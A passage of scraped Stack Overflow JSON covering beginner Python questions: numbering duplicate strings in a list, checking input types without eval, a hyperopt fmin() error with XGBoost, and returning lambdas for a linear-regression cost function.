"last_activity_date": 1571863859, "last_edit_date": 1571863859, "creation_date": 1571863479, "answer_id": 58530758, "question_id": 58530678, "link": "https://stackoverflow.com/questions/58530678/counting-string-occurences-enumerating-occurrences-in-the-list/58530758#58530758", "title": "Counting String occurence(s) / Enumerating occurrence(s) in the list", "body": "<ul>\n<li>you need to add original string into <code>res</code> to keep count.</li>\n<li>i suggest create another array for this. <code>cnt</code>.</li>\n<li>Because after second iteration of <code>hey</code>. you will have <code>res = ['hey', 'hey1']</code> and for next hey count of <code>hey</code> in res still stays <code>1</code>.</li>\n</ul>\n\n<pre><code>test = int(input())\ntexts=[]\nfor i in range(test):\n    texts.append(input())\nres=[]\ncnt=[]\nfor i in texts:\n    if i in res:\n       # print(i)\n        c=cnt.count(i)\n        o=i+str(c)\n        res.append(o)\n        cnt.append(i)\n    else:\n        res.append(i)\n        cnt.append(i)\n\nprint(res)\n</code></pre>\n\n<p>ps: Your method is not most optimal method to do the task. I suggest using <code>Counter</code> for this.</p>\n\n<pre><code>from collections import Counter\ntest = int(input())\ntexts=[]\nfor i in range(test):\n    texts.append(input())\nc = Counter(texts)\nres = []\nfor x,y in c.items():\n    for i in range(y):\n        res.append(x if i==0 else x+str(i))\n\nprint(res)\n</code></pre>\n\n<ul>\n<li>output</li>\n</ul>\n\n<blockquote>\n  <p>['hey', 'hey1', 'hey2', 'hey3', 'alan', 'alan1']</p>\n</blockquote>\n"}, {"tags": [], "owner": {"reputation": 913, "user_id": 11711953, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/oC1SZ.jpg?s=128&g=1", "display_name": "Alexey", "link": "https://stackoverflow.com/users/11711953/alexey"}, "is_accepted": false, "score": 0, "last_activity_date": 1571867901, "last_edit_date": 1571867901, "creation_date": 1571865021, "answer_id": 58531031, "question_id": 58530678, "link": "https://stackoverflow.com/questions/58530678/counting-string-occurences-enumerating-occurrences-in-the-list/58531031#58531031", "title": "Counting String occurence(s) / Enumerating occurrence(s) in the list", "body": "<p>this version with DataFrame usage:</p>\n\n<pre><code>l1 = ['hey','alan','hey','hey','hey','alan']\n\ndf = pd.DataFrame(l1, columns = ['name'])\n\nOut[1]:\n    name\n0   hey \n1   alan\n2   hey \n3   hey \n4   hey \n5   alan\n\ndf['num'] = df.groupby(['name']).cumcount()\n\nOut[2]:\n    name    num\n0   hey     0\n1   alan    0\n2   hey     1\n3   hey     2\n4   hey     3\n5   alan    1\n\n\ndf['num_name'] = [(lambda x: x[0] + (str(x[1]) if x[1]!=0 else ''))(s) for s in zip(df['name'], df['num'])]\n\nOut[3]:\n    name    num num_name\n0   hey     0   hey\n1   alan    0   alan\n2   hey     1   hey1\n3   hey     2   hey2\n4   hey     3   hey3\n5   alan    1   alan1\n\nlist(df['num_name'])\n\nOut[4]:\n['hey', 'alan', 'hey1', 'hey2', 'hey3', 'alan1']\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 11, "user_id": 11761182, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-5Aq4pxeU-Iw/AAAAAAAAAAI/AAAAAAAAKAY/pFwMrGBW-B0/photo.jpg?sz=128", "display_name": "Vamshi Duddu", "link": "https://stackoverflow.com/users/11761182/vamshi-duddu"}, "edited": false, "score": 0, "creation_date": 1571900793, "post_id": 58532432, "comment_id": 103394532, "body": "thanks mate..! i found another way without using enumerate"}], "tags": [], "owner": {"reputation": 3426, "user_id": 10818128, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-YiTeo4kuZiQ/AAAAAAAAAAI/AAAAAAAAAAA/AKxrwcYYf6McGCeXvwrDf9sDgLHNO5VGKQ/mo/photo.jpg?sz=128", "display_name": "Derek Eden", "link": "https://stackoverflow.com/users/10818128/derek-eden"}, "is_accepted": false, "score": 0, "last_activity_date": 1571875542, "creation_date": 1571875542, "answer_id": 58532432, "question_id": 58530678, "link": "https://stackoverflow.com/questions/58530678/counting-string-occurences-enumerating-occurrences-in-the-list/58532432#58532432", "title": "Counting String occurence(s) / Enumerating occurrence(s) in the list", "body": "<p>you can do this pretty simply by just counting the number of occurrences of each element of the list while iterating through it, and appending the count for all the occurrences past 0:</p>\n\n<pre><code>out = [] \nfor i,word in enumerate(l):\n    count = l[:i].count(word)\n    if count == 0:\n        out.append(word)\n    else:\n        out.append(word+str(count))\n</code></pre>\n\n<p>out:</p>\n\n<pre><code>['hey', 'alan', 'hey1', 'hey2', 'hey3', 'alan1']\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 3424, "user_id": 3750257, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KF8gx.png?s=128&g=1", "display_name": "pppery", "link": "https://stackoverflow.com/users/3750257/pppery"}, "edited": false, "score": 0, "creation_date": 1571944499, "post_id": 58535987, "comment_id": 103416521, "body": "This would be a better answer if you explained how the code you provided answers the question."}], "tags": [], "owner": {"reputation": 11, "user_id": 11761182, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-5Aq4pxeU-Iw/AAAAAAAAAAI/AAAAAAAAKAY/pFwMrGBW-B0/photo.jpg?sz=128", "display_name": "Vamshi Duddu", "link": "https://stackoverflow.com/users/11761182/vamshi-duddu"}, "is_accepted": true, "score": 0, "last_activity_date": 1571900967, "creation_date": 1571900967, "answer_id": 58535987, "question_id": 58530678, "link": "https://stackoverflow.com/questions/58530678/counting-string-occurences-enumerating-occurrences-in-the-list/58535987#58535987", "title": "Counting String occurence(s) / Enumerating occurrence(s) in the list", "body": "<pre><code>test = int(input())\nl=[]\n\nfor i in range(test):\n  l.append(input())\nres=[]\nfor i in range(len(l)):\n   count =l[:i].count(l[i])\n   if count==0:\n      res.append(l[i])\n   else:\n      res.append(l[i]+str(count))\nprint(res)\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 11761182, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-5Aq4pxeU-Iw/AAAAAAAAAAI/AAAAAAAAKAY/pFwMrGBW-B0/photo.jpg?sz=128", "display_name": "Vamshi Duddu", "link": "https://stackoverflow.com/users/11761182/vamshi-duddu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 69, "favorite_count": 0, "accepted_answer_id": 58535987, "answer_count": 5, "score": 1, "last_activity_date": 1571900967, "creation_date": 1571863093, "last_edit_date": 1571869771, "question_id": 58530678, "link": "https://stackoverflow.com/questions/58530678/counting-string-occurences-enumerating-occurrences-in-the-list", "title": "Counting String occurence(s) / Enumerating occurrence(s) in the list", "body": "<p>I need to update the list(s) as shown below</p>\n\n<pre><code>l=['hey','alan','hey','hey','hey','alan']\n</code></pre>\n\n<p>and result must be</p>\n\n<pre><code>l=['hey','alan','hey1','hey2','hey3','alan1']\n</code></pre>\n\n<p>My code:</p>\n\n<pre><code>test = int(input())\ntexts=[]\nfor i in range(test):\n    texts.append(input())\nres=[]\nfor i in texts:\n    if i in res:\n       # print(i)\n        c=res.count(i)\n        o=i+str(c)\n        res.append(o)\n    else:\n        res.append(i)\n\nprint(res)\n</code></pre>\n\n<p>Actual output:</p>\n\n<pre><code>['hey', 'hey1', 'hey1']\n</code></pre>\n\n<p>expected output:</p>\n\n<pre><code>['hey', 'hey1', 'hey2']\n</code></pre>\n"}, {"tags": ["python"], "comments": [{"owner": {"reputation": 8368, "user_id": 4669778, "user_type": "registered", "accept_rate": 86, "profile_image": "https://lh4.googleusercontent.com/-Iz_f3T23jC4/AAAAAAAAAAI/AAAAAAAADVQ/_H_y2EUoF7c/photo.jpg?sz=128", "display_name": "Ofer Sadan", "link": "https://stackoverflow.com/users/4669778/ofer-sadan"}, "edited": false, "score": 0, "creation_date": 1571863132, "post_id": 58530668, "comment_id": 103385178, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/23294658/asking-the-user-for-input-until-they-give-a-valid-response\">Asking the user for input until they give a valid response</a>"}, {"owner": {"reputation": 1083, "user_id": 4739755, "user_type": "registered", "accept_rate": 60, "profile_image": "https://lh5.googleusercontent.com/-xGt648wZsco/AAAAAAAAAAI/AAAAAAAAAGo/EfA-KvgfzKo/photo.jpg?sz=128", "display_name": "b_c", "link": "https://stackoverflow.com/users/4739755/b-c"}, "edited": false, "score": 2, "creation_date": 1571863602, "post_id": 58530668, "comment_id": 103385391, "body": "Be <i>very</i> careful of using <a href=\"https://stackoverflow.com/a/1832957/4739755\"><code>eval</code></a> - there&#39;s almost always a better way to do whatever you&#39;re using <code>eval</code> to do. You should also look into the python string methods, specifically <a href=\"https://docs.python.org/3/library/stdtypes.html#str.isnumeric\" rel=\"nofollow noreferrer\"><code>string.isnumeric</code></a>. The return of <code>input</code> will always be a string initially."}, {"owner": {"reputation": 1, "user_id": 12264307, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7593dc17b7bb10d5244eeb2560d4cb1c?s=128&d=identicon&r=PG&f=1", "display_name": "RicardoGoncalves", "link": "https://stackoverflow.com/users/12264307/ricardogoncalves"}, "edited": false, "score": 0, "creation_date": 1571864105, "post_id": 58530668, "comment_id": 103385568, "body": "To be honest I don&#39;t really understand the use of <code>eval</code>. It was a suggestion of a class mate. My understanding of python is still very limited. I learned only a bit about basic operations, functions, data types, while and for loops. I never heard about <code>string.isnumeric</code> which looks like can solve my problem. I just want to solve the problem with the my limited knowledge on the subject"}, {"owner": {"reputation": 4770, "user_id": 6340496, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/a2hM0.png?s=128&g=1", "display_name": "S3DEV", "link": "https://stackoverflow.com/users/6340496/s3dev"}, "edited": false, "score": 0, "creation_date": 1571864932, "post_id": 58530668, "comment_id": 103385846, "body": "Use the <b>isinstance()</b> built-in function to test data types.  It takes two parameters, your variable and the expected type.  Very simple."}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 12264307, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7593dc17b7bb10d5244eeb2560d4cb1c?s=128&d=identicon&r=PG&f=1", "display_name": "RicardoGoncalves", "link": "https://stackoverflow.com/users/12264307/ricardogoncalves"}, "edited": false, "score": 0, "creation_date": 1571865074, "post_id": 58530963, "comment_id": 103385886, "body": "The problem then is that every input will be identified as a string as by default <code>input()</code> stores the value as a string. So how can I test if the user input was a number or a string?"}], "tags": [], "owner": {"reputation": 70549, "user_id": 4785185, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ChR5h.jpg?s=128&g=1", "display_name": "Prune", "link": "https://stackoverflow.com/users/4785185/prune"}, "is_accepted": false, "score": 0, "last_activity_date": 1571864676, "creation_date": 1571864676, "answer_id": 58530963, "question_id": 58530668, "link": "https://stackoverflow.com/questions/58530668/how-to-find-type-of-user-input-and-print-different-values-depending-on-the-type/58530963#58530963", "title": "How to find type of user input and print different values depending on the type of input in Python 3.x", "body": "<p>You're trying to <code>eval</code> input before you know it's needed.  Get rid of it entirely:</p>\n\n<pre><code>def findt():\n    userin = input(\"Input: \")       # Takes user input\n\n    if type(userin) == int:        # If input is an int\n        userfloat = float(userin)  # Modifies into a float\n...\n</code></pre>\n\n<p>The root problem is that you can't evaluate an undefined name.\nIf your input is a string that is <em>not</em> the name of an object in your program, it will fail.  <code>eval</code> requires everything you feed it to be defined.</p>\n"}, {"comments": [{"owner": {"reputation": 1, "user_id": 12264307, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7593dc17b7bb10d5244eeb2560d4cb1c?s=128&d=identicon&r=PG&f=1", "display_name": "RicardoGoncalves", "link": "https://stackoverflow.com/users/12264307/ricardogoncalves"}, "edited": false, "score": 0, "creation_date": 1571865272, "post_id": 58531029, "comment_id": 103385950, "body": "it still doesn&#39;t work. If the input is a float it treats it as a string"}, {"owner": {"reputation": 1, "user_id": 12264307, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7593dc17b7bb10d5244eeb2560d4cb1c?s=128&d=identicon&r=PG&f=1", "display_name": "RicardoGoncalves", "link": "https://stackoverflow.com/users/12264307/ricardogoncalves"}, "edited": false, "score": 0, "creation_date": 1571868616, "post_id": 58531029, "comment_id": 103386970, "body": "Thank you very much for your help. I followed your suggestion and found my own solution that I posted."}, {"owner": {"reputation": 1068, "user_id": 7211815, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6qt3B.png?s=128&g=1", "display_name": "codrelphi", "link": "https://stackoverflow.com/users/7211815/codrelphi"}, "reply_to_user": {"reputation": 1, "user_id": 12264307, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7593dc17b7bb10d5244eeb2560d4cb1c?s=128&d=identicon&r=PG&f=1", "display_name": "RicardoGoncalves", "link": "https://stackoverflow.com/users/12264307/ricardogoncalves"}, "edited": false, "score": 0, "creation_date": 1571868663, "post_id": 58531029, "comment_id": 103386983, "body": "Ok. So, you can upvote my post or accept it. It will be helpful for others..."}], "tags": [], "owner": {"reputation": 1068, "user_id": 7211815, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6qt3B.png?s=128&g=1", "display_name": "codrelphi", "link": "https://stackoverflow.com/users/7211815/codrelphi"}, "is_accepted": false, "score": 0, "last_activity_date": 1571869090, "last_edit_date": 1571869090, "creation_date": 1571865006, "answer_id": 58531029, "question_id": 58530668, "link": "https://stackoverflow.com/questions/58530668/how-to-find-type-of-user-input-and-print-different-values-depending-on-the-type/58531029#58531029", "title": "How to find type of user input and print different values depending on the type of input in Python 3.x", "body": "<p>Here is a better way to achieve your goal by using the string method <code>isnumeric()</code> to test if the input is numeric or not.</p>\n\n<pre><code>def findt():\n    userin = input(\"Input: \")\n\n    if userin.isnumeric():\n        # userin is numeric\n        result = float(userin) ** 2\n        print(result)\n\n    else:\n        try:\n            # userin is a float\n            result = float(userin) ** 2\n            print(result)\n        except ValueError:\n            # userin is a string\n            print(\"Sorry Dave, I'm afraid I can't do that\")\n            return 0.0\n\nfindt()\n</code></pre>\n\n<blockquote>\n  <p><strong>Update:</strong> a concise version:</p>\n</blockquote>\n\n<pre><code>def findt():\n    userin = input(\"Input: \")\n\n    try:\n        # userin is an int or float\n        result = float(userin) ** 2\n        print(result)\n    except ValueError:\n        # userin is a string\n        print(\"Sorry Dave, I'm afraid I can't do that\")\n        return 0.0\n\nfindt()\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1, "user_id": 12264307, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7593dc17b7bb10d5244eeb2560d4cb1c?s=128&d=identicon&r=PG&f=1", "display_name": "RicardoGoncalves", "link": "https://stackoverflow.com/users/12264307/ricardogoncalves"}, "is_accepted": true, "score": 0, "last_activity_date": 1571868525, "creation_date": 1571868525, "answer_id": 58531578, "question_id": 58530668, "link": "https://stackoverflow.com/questions/58530668/how-to-find-type-of-user-input-and-print-different-values-depending-on-the-type/58531578#58531578", "title": "How to find type of user input and print different values depending on the type of input in Python 3.x", "body": "<p>I found the solution for my problem. \nThe way I did it I take the input from the user and i <code>try</code> to convert it to a float. If it is a number it will convert and print a float that is the square of the input. If the input is a string it cannot be converted to a float and will give me an error so I use an <code>except ValueError:</code> to print the string I want and return 0.0. </p>\n\n<pre><code>def whattype():\n    user_input = input(\"&gt;&gt;&gt; \")\n    try:                                                \n            user_input = float(user_input)                      \n            print(user_input ** 2)\n    except ValueError:\n            print(\"Sorry Dave, I'm afraid I can't do that\")\n            return 0.0\n\nwhattype()\n</code></pre>\n\n<p>Thank you all for the suggestions and help</p>\n"}], "owner": {"reputation": 1, "user_id": 12264307, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7593dc17b7bb10d5244eeb2560d4cb1c?s=128&d=identicon&r=PG&f=1", "display_name": "RicardoGoncalves", "link": "https://stackoverflow.com/users/12264307/ricardogoncalves"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 138, "favorite_count": 0, "accepted_answer_id": 58531578, "answer_count": 3, "score": 0, "last_activity_date": 1571869090, "creation_date": 1571863032, "last_edit_date": 1571864128, "question_id": 58530668, "link": "https://stackoverflow.com/questions/58530668/how-to-find-type-of-user-input-and-print-different-values-depending-on-the-type", "title": "How to find type of user input and print different values depending on the type of input in Python 3.x", "body": "<blockquote>\n  <p>Develop a Python function which either returns the float square of its parameter x if the parameter is a number, or prints the string \"Sorry Dave, I'm afraid I can't do that\" if the parameter is a string, and then returns 0.0.</p>\n</blockquote>\n\n<p>What am I doing wrong? I'm a first year CS student and I have no previous programming background.</p>\n\n<p>I created a function that takes user input, evaluates what type of input it is and print different out puts for number and strings.</p>\n\n<p>For that I used <code>eval(var)</code> func. I also the <code>type(var) == type</code> to verify the type and a <code>if-else</code> loop.</p>\n\n<pre><code>def findt():\n    userin = input(\"Input: \")       # Takes user input\n    inpeval = eval(userin)          # Evaluates input type    \n\n    if type(inpeval) == int:        # If input is an int\n        userfloat = float(inpeval)  # Modifies into a float\n        print(userfloat ** 2)       # Prints the square of the value\n    elif type(inpeval) == float:    # If input is a float\n        print(inpreval ** 2)        # Prints the square of the value\n    elif type(userin) == str:       # If input is a string\n        print(\"Sorry Dave, I'm afraid I can't do that\")   # Print a string\n        return 0.0                  # Return 0.0\n    else:\n        print(\"Invalid Input\")    \nfindt()\n</code></pre>\n\n<p>When I run my code it works well when input is an int, a float or a char. But if I write more than one char it returns me an error:</p>\n\n<pre><code>NameError: name 'whateverinput' is not defined.\n</code></pre>\n"}, {"tags": ["python", "xgboost", "databricks", "hyperopt"], "answers": [{"tags": [], "owner": {"reputation": 20467, "user_id": 4989676, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jP8H6.jpg?s=128&g=1", "display_name": "Peter Pan", "link": "https://stackoverflow.com/users/4989676/peter-pan"}, "is_accepted": false, "score": 0, "last_activity_date": 1572333634, "creation_date": 1572333634, "answer_id": 58602877, "question_id": 58530665, "link": "https://stackoverflow.com/questions/58530665/i-have-a-big-with-the-fmin-function-using-the-hyperopt-package-for-xgboost/58602877#58602877", "title": "I have a big with the fmin() function using the hyperopt package for Xgboost", "body": "<p>The blog <a href=\"https://www.dataiku.com/learn/guide/code/python/advanced-xgboost-tuning.html\" rel=\"nofollow noreferrer\">Advanced XGBoost tuning in Python</a> you refered is post in <strong><em>August 22, 2016</em></strong>, as the figure below. </p>\n\n<p><a href=\"https://i.stack.imgur.com/HCYXh.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/HCYXh.png\" alt=\"enter image description here\"></a></p>\n\n<p>I think it's for the old version, may be not situable for using the lastest version of <code>hyperopt</code> package.</p>\n\n<p>So please see the latest <code>hyperopt</code> wiki page for <a href=\"https://github.com/hyperopt/hyperopt/wiki/FMin\" rel=\"nofollow noreferrer\"><code>FMin</code></a>. Here is a simple sample code as below.</p>\n\n<pre><code>from hyperopt import fmin, tpe, hp\nbest = fmin(fn=lambda x: x ** 2,\n    space=hp.uniform('x', -10, 10),\n    algo=tpe.suggest,\n    max_evals=100)\nprint best\n</code></pre>\n\n<p>You can see that the <code>space</code> type should be <code>hyperopt.pyll.Apply</code>, not a Python dictionary, please see the <a href=\"https://github.com/hyperopt/hyperopt/blob/23a42a34052699bf7433f4a7c0a659cdab87ce54/hyperopt/fmin.py#L281\" rel=\"nofollow noreferrer\">code</a> from the GitHub repo as the figure below.</p>\n\n<p><a href=\"https://i.stack.imgur.com/HULwy.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/HULwy.png\" alt=\"enter image description here\"></a></p>\n"}], "owner": {"reputation": 11, "user_id": 12265387, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cab5ea551c1bc5cc3b10762e6e2f598b?s=128&d=identicon&r=PG&f=1", "display_name": "afolabiayoola", "link": "https://stackoverflow.com/users/12265387/afolabiayoola"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 149, "favorite_count": 1, "answer_count": 1, "score": 1, "last_activity_date": 1572333634, "creation_date": 1571863025, "question_id": 58530665, "link": "https://stackoverflow.com/questions/58530665/i-have-a-big-with-the-fmin-function-using-the-hyperopt-package-for-xgboost", "title": "I have a big with the fmin() function using the hyperopt package for Xgboost", "body": "<p>Using databricks I have basically copied and pasted the same code from here: <a href=\"https://www.dataiku.com/learn/guide/code/python/advanced-xgboost-tuning.html\" rel=\"nofollow noreferrer\">https://www.dataiku.com/learn/guide/code/python/advanced-xgboost-tuning.html</a></p>\n\n<p>I am getting this bug:</p>\n\n<pre><code>train = data.sample(frac=0.70, random_state=123)\nvalid = data.loc[~data.index.isin(train.index), :]\n\ny_train = train['target']\nX_train = train.drop(['target'], axis=1) \ny_valid = test['target']\nX_valid = test.drop(['target'], axis=1) \ndef objective(space):\n\n    clf = xgb.XGBClassifier(n_estimators = 10000,\n                            max_depth = space['max_depth'],\n                            min_child_weight = space['min_child_weight'],\n                            subsample = space['subsample'])\n\n    eval_set  = [( train, y_train), ( valid, y_valid)]\n\n    clf.fit(train[col_train], y_train,\n            eval_set=eval_set, eval_metric=\"auc\",\n            early_stopping_rounds=30)\n\n    pred = clf.predict_proba(valid)[:,1]\n    auc = roc_auc_score(y_valid, pred)\n    print(\"SCORE:\", auc)\n\n    return{'loss':1-auc, 'status': STATUS_OK }\n\n\nspace ={\n        'max_depth': hp.quniform(\"x_max_depth\", 5, 30, 1),\n        'min_child_weight': hp.quniform ('x_min_child', 1, 10, 1),\n        'subsample': hp.uniform ('x_subsample', 0.8, 1)\n    }\n\n\ntrials = Trials()\nbest = fmin(fn=objective,\n            space =space,\n            algo=tpe.suggest,\n            max_evals=100,\n            trials=trials)\n\n\nprint(best)\n</code></pre>\n\n<p>The bug I get is as follows:</p>\n\n<pre><code>ValueError: invalid number of arguments\n---------------------------------------------------------------------------\nValueError                                Traceback (most recent call last)\n&lt;command-3897094&gt; in &lt;module&gt;()\n      4             algo=tpe.suggest,\n      5             max_evals=100,\n----&gt; 6             trials=trials)\n      7 \n      8 \n\nValueError: invalid number of arguments\n\n</code></pre>\n\n<p>Any insight would help please. First question on stack overflow!</p>\n"}, {"tags": ["python", "function", "numpy", "linear-regression", "data-science"], "comments": [{"owner": {"reputation": 8368, "user_id": 4669778, "user_type": "registered", "accept_rate": 86, "profile_image": "https://lh4.googleusercontent.com/-Iz_f3T23jC4/AAAAAAAAAAI/AAAAAAAADVQ/_H_y2EUoF7c/photo.jpg?sz=128", "display_name": "Ofer Sadan", "link": "https://stackoverflow.com/users/4669778/ofer-sadan"}, "edited": false, "score": 0, "creation_date": 1571863044, "post_id": 58530632, "comment_id": 103385144, "body": "it&#39;s written pretty clearly - <code>mse_cost_function</code> should return a function (a lambda), which is why doing <code>j(2.1, 2.9)</code> is perfectly reasonable"}, {"owner": {"reputation": 47088, "user_id": 7207392, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/dadc9567dde5f02b09a29695eca1ce40?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Panzer", "link": "https://stackoverflow.com/users/7207392/paul-panzer"}, "edited": false, "score": 0, "creation_date": 1571864872, "post_id": 58530632, "comment_id": 103385821, "body": "In Python functions like almost everything else are <a href=\"https://stackoverflow.com/q/245192/7207392\">&quot;first class objects&quot;</a> meaning you can store them in variables pass them around as arguments or return values of other functions etc."}], "answers": [{"tags": [], "owner": {"reputation": 4856, "user_id": 3700626, "user_type": "registered", "accept_rate": 30, "profile_image": "https://i.stack.imgur.com/LGCnh.jpg?s=128&g=1", "display_name": "Lior Cohen", "link": "https://stackoverflow.com/users/3700626/lior-cohen"}, "is_accepted": false, "score": 1, "last_activity_date": 1571867144, "last_edit_date": 1571867144, "creation_date": 1571863164, "answer_id": 58530697, "question_id": 58530632, "link": "https://stackoverflow.com/questions/58530632/can-a-function-return-a-numpy-parameter-in-python/58530697#58530697", "title": "Can a function return a numpy parameter in python?", "body": "<p>mse_cost_function is a function that returns a <strong>function</strong>.</p>\n\n<blockquote>\n  <p>lambda J(theta_0, theta_1) that models the cost function</p>\n</blockquote>\n\n<p>so j is a <strong>function</strong>.\nlike any function (or more generally callable) it can get inputs (two in this case).</p>\n\n<p>For more simple explanation, here is a function <code>add_x</code> that takes x and returns a new function that takes z and calculates z+x</p>\n\n<pre><code>def add_x(x):\n  return lambda z: z+x\n\n\ng = add_x(3)\nprint(type(g))  # -&gt; &lt;class 'function'&gt;\nprint(g(2))  # 5\n</code></pre>\n"}], "owner": {"reputation": 127, "user_id": 11728893, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/47ec724b11c51d1c3bde0c52f1fdfdac?s=128&d=identicon&r=PG&f=1", "display_name": "hispaniccoder", "link": "https://stackoverflow.com/users/11728893/hispaniccoder"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 41, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1571867144, "creation_date": 1571862895, "question_id": 58530632, "link": "https://stackoverflow.com/questions/58530632/can-a-function-return-a-numpy-parameter-in-python", "title": "Can a function return a numpy parameter in python?", "body": "<p>As part of my ML uni course I am learning linear regression. Strangely, I came across the following problem and I am not sure how to go about it. </p>\n\n<p>given are two vectors x and y :</p>\n\n<pre><code>x = np.linspace(x_min, x_max,50)\ny = np.random.randint(-5/2,5/2, size=50)\ny = y + 3 + 2*x \n</code></pre>\n\n<p>I need to fill in the code in these two methods:</p>\n\n<pre><code>def linear_hypothesis(theta_0, theta_1):\n    ''' Combines given arguments in a linear equation and returns it as a function\n\n    Args:\n        theta_0: first coefficient\n        theta_1: second coefficient\n\n    Returns:\n        lambda that models a linear function based on theta_0, theta_1 and x\n    ''' \ndef mse_cost_function(x, y):\n    ''' Implements MSE cost function as a function J(theta_0, theta_1) on given tranings data \n\n    Args:\n        x: vector of x values \n        y: vector of ground truth values y \n\n    Returns:\n        lambda J(theta_0, theta_1) that models the cost function\n    '''\n</code></pre>\n\n<p>The above functions should then be called through the following code:</p>\n\n<pre><code>j = mse_cost_function(x, y)\nprint(j(2.1, 2.9))\n</code></pre>\n\n<p>And this is what confuses me. I am not sure which the return type of each function should and I dont understand what this line <code>j(2.1, 2.9)</code> is supposed to be doing since j is the return value of this method. could someone enlighten me? Thanks for any help !</p>\n"}]